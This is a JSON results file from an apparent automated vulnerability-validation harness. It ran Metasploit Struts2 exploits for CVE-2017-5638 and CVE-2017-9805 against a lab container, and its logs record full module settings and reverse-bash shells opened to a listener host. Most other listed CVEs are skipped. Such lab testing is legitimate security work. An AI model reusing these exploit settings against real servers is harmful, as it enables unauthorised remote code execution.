@@ -1,0 +1,730 @@
+{
+  "artifact": {
+    "created_at": "2026-09-15T22:15:52Z",
+    "input_config": {
+      "path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output\\2d8ru-struts2-prospective\\resolver\\config\\exploit_config_before_HdiiR_r1.json",
+      "revision": 1,
+      "sha256": "f81d03d73d30aee629e14841de4d4816e6bedfd474c1d61351118a20565bae22"
+    },
+    "phase": "before",
+    "run_id": "HdiiR"
+  },
+  "cves": [
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2021-44228",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 1
+    },
+    {
+      "attempt": {
+        "attempt_id": "HdiiR-02-before-1",
+        "attempt_number": 1,
+        "check_evidence": {
+          "operation": {
+            "ended_at": null,
+            "exit_code": 0,
+            "started_at": null,
+            "state": "EXECUTED",
+            "stderr": "",
+            "stdout": "[*] exec: echo KALAMA_BASELINE_BEGIN\n\nKALAMA_BASELINE_BEGIN\n\nActive sessions\n===============\n\nNo active sessions.\n\n[*] exec: echo KALAMA_BASELINE_END\n\nKALAMA_BASELINE_END\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => auto\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nHTTPMethod => GET\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nRHOSTS => 172.18.0.5\nRPORT => 8080\nSSLVersion => Auto\nTARGETURI => /S2-045/\nPAYLOAD => cmd/unix/reverse_bash\nAutoVerifySession => true\nBashPath => bash\nLHOST => 172.18.0.4\nLPORT => 16051\nReverseAllowProxy => false\nReverseListenerThreaded => false\nShellPath => sh\n[+] 172.18.0.5:8080 - The target is vulnerable. Successfully executed the injected code\n[*] exec: echo KALAMA_EXPLOIT_BEGIN\n\nKALAMA_EXPLOIT_BEGIN\n[*] Started reverse TCP handler on 172.18.0.4:16051 \n[*] Command shell session 1 opened (172.18.0.4:16051 -> 172.18.0.5:34556) at 2026-09-15 22:14:45 +0000\n[*] Session 1 created in the background.\n[*] exec: echo KALAMA_EXPLOIT_END\n\nKALAMA_EXPLOIT_END\n[*] exec: echo KALAMA_POST_BEGIN\n\nKALAMA_POST_BEGIN\n\nActive sessions\n===============\n\n  Session ID: 1\n        Name: \n        Type: shell unix\n        Info: \n      Tunnel: 172.18.0.4:16051 -> 172.18.0.5:34556 (172.18.0.5)\n         Via: exploit/multi/http/struts2_content_type_ognl\n   Encrypted: No\n        UUID: \n     CheckIn: <none>\n  Registered: No\n\n\n\n[*] exec: echo KALAMA_POST_END\n\nKALAMA_POST_END\n",
+            "submitted": true
+          },
+          "verdict": "VULNERABLE"
+        },
+        "config": {
+          "path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output\\2d8ru-struts2-prospective\\resolver\\config\\exploit_config_before_HdiiR_r1.json",
+          "revision": 1,
+          "sha256": "f81d03d73d30aee629e14841de4d4816e6bedfd474c1d61351118a20565bae22"
+        },
+        "cve_id": "CVE-2017-5638",
+        "ended_at": "2026-09-15T22:14:53Z",
+        "environment_validation": {
+          "code": null,
+          "message": null,
+          "observed": {
+            "container_id": "adf18dec3c2ffb30ee3e70507013843306bb6cbb24037c87977d2e632c7b6ba2",
+            "container_name": "victim-HdiiR",
+            "image_digest": "2d8ru/struts2@sha256:7aa386b4b606bec5f6a7f015bab6bd1cc84169beadb2a632b6939e6e703e47db",
+            "image_id": "sha256:7aa386b4b606bec5f6a7f015bab6bd1cc84169beadb2a632b6939e6e703e47db",
+            "ip_address": "172.18.0.5",
+            "network": "kalama-net",
+            "run_id": "HdiiR"
+          },
+          "valid": true
+        },
+        "exploit_evidence": {
+          "ended_at": null,
+          "exit_code": 0,
+          "started_at": null,
+          "state": "EXECUTED",
+          "stderr": "",
+          "stdout": "[*] exec: echo KALAMA_BASELINE_BEGIN\n\nKALAMA_BASELINE_BEGIN\n\nActive sessions\n===============\n\nNo active sessions.\n\n[*] exec: echo KALAMA_BASELINE_END\n\nKALAMA_BASELINE_END\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => auto\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nHTTPMethod => GET\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nRHOSTS => 172.18.0.5\nRPORT => 8080\nSSLVersion => Auto\nTARGETURI => /S2-045/\nPAYLOAD => cmd/unix/reverse_bash\nAutoVerifySession => true\nBashPath => bash\nLHOST => 172.18.0.4\nLPORT => 16051\nReverseAllowProxy => false\nReverseListenerThreaded => false\nShellPath => sh\n[+] 172.18.0.5:8080 - The target is vulnerable. Successfully executed the injected code\n[*] exec: echo KALAMA_EXPLOIT_BEGIN\n\nKALAMA_EXPLOIT_BEGIN\n[*] Started reverse TCP handler on 172.18.0.4:16051 \n[*] Command shell session 1 opened (172.18.0.4:16051 -> 172.18.0.5:34556) at 2026-09-15 22:14:45 +0000\n[*] Session 1 created in the background.\n[*] exec: echo KALAMA_EXPLOIT_END\n\nKALAMA_EXPLOIT_END\n[*] exec: echo KALAMA_POST_BEGIN\n\nKALAMA_POST_BEGIN\n\nActive sessions\n===============\n\n  Session ID: 1\n        Name: \n        Type: shell unix\n        Info: \n      Tunnel: 172.18.0.4:16051 -> 172.18.0.5:34556 (172.18.0.5)\n         Via: exploit/multi/http/struts2_content_type_ognl\n   Encrypted: No\n        UUID: \n     CheckIn: <none>\n  Registered: No\n\n\n\n[*] exec: echo KALAMA_POST_END\n\nKALAMA_POST_END\n",
+          "submitted": true
+        },
+        "impact_evidence": null,
+        "issues": [],
+        "metric_eligibility": {
+          "conditions": {
+            "attributable_session": true,
+            "complete_negative_observation": false,
+            "config_complete": true,
+            "deterministic_impact": false,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "oracle": {
+          "completeness": "FULL",
+          "evidence_basis": "ATTRIBUTABLE_SESSION",
+          "evidence_conflict": false,
+          "metric_eligibility": {
+            "conditions": {
+              "attributable_session": true,
+              "complete_negative_observation": false,
+              "config_complete": true,
+              "deterministic_impact": false,
+              "environment_validated": true,
+              "exploit_executed": true,
+              "exploit_required": true,
+              "invalidating_error": false
+            },
+            "eligible": true,
+            "exclusion_reason": null
+          },
+          "verdict": "VULNERABLE"
+        },
+        "phase": "before",
+        "pre_attack": null,
+        "preconditions": [],
+        "rank": 2,
+        "run_id": "HdiiR",
+        "session_evidence": {
+          "attributable_session_ids": [
+            "1"
+          ],
+          "attribution": "TARGET_MATCH",
+          "baseline_session_ids": [],
+          "error": null,
+          "mismatched_session_ids": [],
+          "new_session_ids": [
+            "1"
+          ],
+          "post_session_ids": [
+            "1"
+          ],
+          "session_details": {
+            "1": {
+              "kalama_attempt_target_container": "victim-HdiiR",
+              "kalama_attempt_target_ip": "172.18.0.5",
+              "kalama_new_in_attempt": true,
+              "raw_line": "Session ID: 1",
+              "tunnel_local": "172.18.0.4:16051",
+              "tunnel_peer": "172.18.0.5:34556",
+              "via_exploit": "exploit/multi/http/struts2_content_type_ognl"
+            }
+          },
+          "status": "COLLECTED"
+        },
+        "started_at": "2026-09-15T22:13:17Z"
+      },
+      "config_status": "READY_TO_EXECUTE",
+      "cve_id": "CVE-2017-5638",
+      "disposition": "EXPLOIT_SUCCEEDED",
+      "metric_eligibility": {
+        "conditions": {
+          "attributable_session": true,
+          "complete_negative_observation": false,
+          "config_complete": true,
+          "deterministic_impact": false,
+          "environment_validated": true,
+          "exploit_executed": true,
+          "exploit_required": true,
+          "invalidating_error": false
+        },
+        "eligible": true,
+        "exclusion_reason": null
+      },
+      "oracle": {
+        "completeness": "FULL",
+        "evidence_basis": "ATTRIBUTABLE_SESSION",
+        "evidence_conflict": false,
+        "metric_eligibility": {
+          "conditions": {
+            "attributable_session": true,
+            "complete_negative_observation": false,
+            "config_complete": true,
+            "deterministic_impact": false,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "verdict": "VULNERABLE"
+      },
+      "rank": 2
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2013-2251",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 3
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2025-24813",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 4
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2022-22965",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 5
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2017-9791",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 6
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2020-17530",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 7
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2012-0391",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 8
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2021-45046",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 9
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2021-39144",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 10
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2018-11776",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 11
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2017-12617",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 12
+    },
+    {
+      "attempt": {
+        "attempt_id": "HdiiR-13-before-1",
+        "attempt_number": 1,
+        "check_evidence": {
+          "operation": {
+            "ended_at": null,
+            "exit_code": 0,
+            "started_at": null,
+            "state": "EXECUTED",
+            "stderr": "",
+            "stdout": "[*] exec: echo KALAMA_BASELINE_BEGIN\n\nKALAMA_BASELINE_BEGIN\n\nActive sessions\n===============\n\nNo active sessions.\n\n[*] exec: echo KALAMA_BASELINE_END\n\nKALAMA_BASELINE_END\n[*] No payload configured, defaulting to cmd/unix/php/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => <redacted>\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nHTTP::server_name => Apache\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nPowershell::encode_final_payload => false\nPowershell::encode_inner_payload => false\nPowershell::exec_in_place => false\nPowershell::exec_rc4 => false\nPowershell::method => reflection\nPowershell::no_equals => false\nPowershell::noninteractive => true\nPowershell::persist => false\nPowershell::prepend_protections_bypass => <redacted>\nPowershell::remove_comspec => false\nPowershell::strip_comments => true\nPowershell::strip_whitespace => false\nPowershell::sub_funcs => false\nPowershell::sub_vars => true\nPowershell::wrap_double_quotes => true\nRHOSTS => 172.18.0.5\nRPORT => 8080\nSRVPORT => 8080\nSSLVersion => Auto\nTARGETURI => /S2-052/orders/3\nPAYLOAD => cmd/unix/reverse_bash\nAutoVerifySession => true\nBashPath => bash\nLHOST => 172.18.0.4\nLPORT => 16052\nReverseAllowProxy => false\nReverseListenerThreaded => false\nShellPath => sh\n[+] 172.18.0.5:8080 - The target appears to be vulnerable. The target appears to be vulnerable\n[*] exec: echo KALAMA_EXPLOIT_BEGIN\n\nKALAMA_EXPLOIT_BEGIN\n[*] Started reverse TCP handler on 172.18.0.4:16052 \n[*] Command shell session 1 opened (172.18.0.4:16052 -> 172.18.0.5:39510) at 2026-09-15 22:15:44 +0000\n[*] Session 1 created in the background.\n[*] exec: echo KALAMA_EXPLOIT_END\n\nKALAMA_EXPLOIT_END\n[*] exec: echo KALAMA_POST_BEGIN\n\nKALAMA_POST_BEGIN\n\nActive sessions\n===============\n\n  Session ID: 1\n        Name: \n        Type: shell unix\n        Info: \n      Tunnel: 172.18.0.4:16052 -> 172.18.0.5:39510 (172.18.0.5)\n         Via: exploit/multi/http/struts2_rest_xstream\n   Encrypted: No\n        UUID: \n     CheckIn: <none>\n  Registered: No\n\n\n\n[*] exec: echo KALAMA_POST_END\n\nKALAMA_POST_END\n",
+            "submitted": true
+          },
+          "verdict": "VULNERABLE"
+        },
+        "config": {
+          "path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output\\2d8ru-struts2-prospective\\resolver\\config\\exploit_config_before_HdiiR_r1.json",
+          "revision": 1,
+          "sha256": "f81d03d73d30aee629e14841de4d4816e6bedfd474c1d61351118a20565bae22"
+        },
+        "cve_id": "CVE-2017-9805",
+        "ended_at": "2026-09-15T22:15:52Z",
+        "environment_validation": {
+          "code": null,
+          "message": null,
+          "observed": {
+            "container_id": "adf18dec3c2ffb30ee3e70507013843306bb6cbb24037c87977d2e632c7b6ba2",
+            "container_name": "victim-HdiiR",
+            "image_digest": "2d8ru/struts2@sha256:7aa386b4b606bec5f6a7f015bab6bd1cc84169beadb2a632b6939e6e703e47db",
+            "image_id": "sha256:7aa386b4b606bec5f6a7f015bab6bd1cc84169beadb2a632b6939e6e703e47db",
+            "ip_address": "172.18.0.5",
+            "network": "kalama-net",
+            "run_id": "HdiiR"
+          },
+          "valid": true
+        },
+        "exploit_evidence": {
+          "ended_at": null,
+          "exit_code": 0,
+          "started_at": null,
+          "state": "EXECUTED",
+          "stderr": "",
+          "stdout": "[*] exec: echo KALAMA_BASELINE_BEGIN\n\nKALAMA_BASELINE_BEGIN\n\nActive sessions\n===============\n\nNo active sessions.\n\n[*] exec: echo KALAMA_BASELINE_END\n\nKALAMA_BASELINE_END\n[*] No payload configured, defaulting to cmd/unix/php/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => <redacted>\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nHTTP::server_name => Apache\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nPowershell::encode_final_payload => false\nPowershell::encode_inner_payload => false\nPowershell::exec_in_place => false\nPowershell::exec_rc4 => false\nPowershell::method => reflection\nPowershell::no_equals => false\nPowershell::noninteractive => true\nPowershell::persist => false\nPowershell::prepend_protections_bypass => <redacted>\nPowershell::remove_comspec => false\nPowershell::strip_comments => true\nPowershell::strip_whitespace => false\nPowershell::sub_funcs => false\nPowershell::sub_vars => true\nPowershell::wrap_double_quotes => true\nRHOSTS => 172.18.0.5\nRPORT => 8080\nSRVPORT => 8080\nSSLVersion => Auto\nTARGETURI => /S2-052/orders/3\nPAYLOAD => cmd/unix/reverse_bash\nAutoVerifySession => true\nBashPath => bash\nLHOST => 172.18.0.4\nLPORT => 16052\nReverseAllowProxy => false\nReverseListenerThreaded => false\nShellPath => sh\n[+] 172.18.0.5:8080 - The target appears to be vulnerable. The target appears to be vulnerable\n[*] exec: echo KALAMA_EXPLOIT_BEGIN\n\nKALAMA_EXPLOIT_BEGIN\n[*] Started reverse TCP handler on 172.18.0.4:16052 \n[*] Command shell session 1 opened (172.18.0.4:16052 -> 172.18.0.5:39510) at 2026-09-15 22:15:44 +0000\n[*] Session 1 created in the background.\n[*] exec: echo KALAMA_EXPLOIT_END\n\nKALAMA_EXPLOIT_END\n[*] exec: echo KALAMA_POST_BEGIN\n\nKALAMA_POST_BEGIN\n\nActive sessions\n===============\n\n  Session ID: 1\n        Name: \n        Type: shell unix\n        Info: \n      Tunnel: 172.18.0.4:16052 -> 172.18.0.5:39510 (172.18.0.5)\n         Via: exploit/multi/http/struts2_rest_xstream\n   Encrypted: No\n        UUID: \n     CheckIn: <none>\n  Registered: No\n\n\n\n[*] exec: echo KALAMA_POST_END\n\nKALAMA_POST_END\n",
+          "submitted": true
+        },
+        "impact_evidence": null,
+        "issues": [],
+        "metric_eligibility": {
+          "conditions": {
+            "attributable_session": true,
+            "complete_negative_observation": false,
+            "config_complete": true,
+            "deterministic_impact": false,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "oracle": {
+          "completeness": "FULL",
+          "evidence_basis": "ATTRIBUTABLE_SESSION",
+          "evidence_conflict": false,
+          "metric_eligibility": {
+            "conditions": {
+              "attributable_session": true,
+              "complete_negative_observation": false,
+              "config_complete": true,
+              "deterministic_impact": false,
+              "environment_validated": true,
+              "exploit_executed": true,
+              "exploit_required": true,
+              "invalidating_error": false
+            },
+            "eligible": true,
+            "exclusion_reason": null
+          },
+          "verdict": "VULNERABLE"
+        },
+        "phase": "before",
+        "pre_attack": null,
+        "preconditions": [],
+        "rank": 13,
+        "run_id": "HdiiR",
+        "session_evidence": {
+          "attributable_session_ids": [
+            "1"
+          ],
+          "attribution": "TARGET_MATCH",
+          "baseline_session_ids": [],
+          "error": null,
+          "mismatched_session_ids": [],
+          "new_session_ids": [
+            "1"
+          ],
+          "post_session_ids": [
+            "1"
+          ],
+          "session_details": {
+            "1": {
+              "kalama_attempt_target_container": "victim-HdiiR",
+              "kalama_attempt_target_ip": "172.18.0.5",
+              "kalama_new_in_attempt": true,
+              "raw_line": "Session ID: 1",
+              "tunnel_local": "172.18.0.4:16052",
+              "tunnel_peer": "172.18.0.5:39510",
+              "via_exploit": "exploit/multi/http/struts2_rest_xstream"
+            }
+          },
+          "status": "COLLECTED"
+        },
+        "started_at": "2026-09-15T22:14:53Z"
+      },
+      "config_status": "READY_TO_EXECUTE",
+      "cve_id": "CVE-2017-9805",
+      "disposition": "EXPLOIT_SUCCEEDED",
+      "metric_eligibility": {
+        "conditions": {
+          "attributable_session": true,
+          "complete_negative_observation": false,
+          "config_complete": true,
+          "deterministic_impact": false,
+          "environment_validated": true,
+          "exploit_executed": true,
+          "exploit_required": true,
+          "invalidating_error": false
+        },
+        "eligible": true,
+        "exclusion_reason": null
+      },
+      "oracle": {
+        "completeness": "FULL",
+        "evidence_basis": "ATTRIBUTABLE_SESSION",
+        "evidence_conflict": false,
+        "metric_eligibility": {
+          "conditions": {
+            "attributable_session": true,
+            "complete_negative_observation": false,
+            "config_complete": true,
+            "deterministic_impact": false,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "verdict": "VULNERABLE"
+      },
+      "rank": 13
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2020-15999",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 14
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2023-44487",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 15
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2019-0230",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 16
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2017-5645",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 17
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2011-3923",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 18
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2017-12611",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 19
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2015-7501",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 20
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-31805",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 21
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2013-7285",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 22
+    },
+    {
+      "attempt": null,
+      "config_status": "USER_SKIPPED",
+      "cve_id": "CVE-2016-3087",
+      "disposition": "NOT_EXECUTED",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "USER_SKIPPED"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 23
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2023-50164",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 24
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2024-53677",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 25
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2013-1965",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 26
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-21346",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 27
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-21344",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 28
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-21345",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 29
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2020-10188",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 30
+    }
+  ],
+  "schema": "kalama.attack-result/v1",
+  "summary": {
+    "CHECK_ONLY": 0,
+    "ENVIRONMENT_ERROR": 0,
+    "EXPLOIT_FAILED": 0,
+    "EXPLOIT_SUCCEEDED": 2,
+    "INCONCLUSIVE": 0,
+    "NOT_EXECUTED": 0,
+    "NO_MSF_MODULE": 14,
+    "USER_SKIPPED": 14,
+    "attempted": 2,
+    "metric_eligible": 2,
+    "selected": 30
+  }
+}
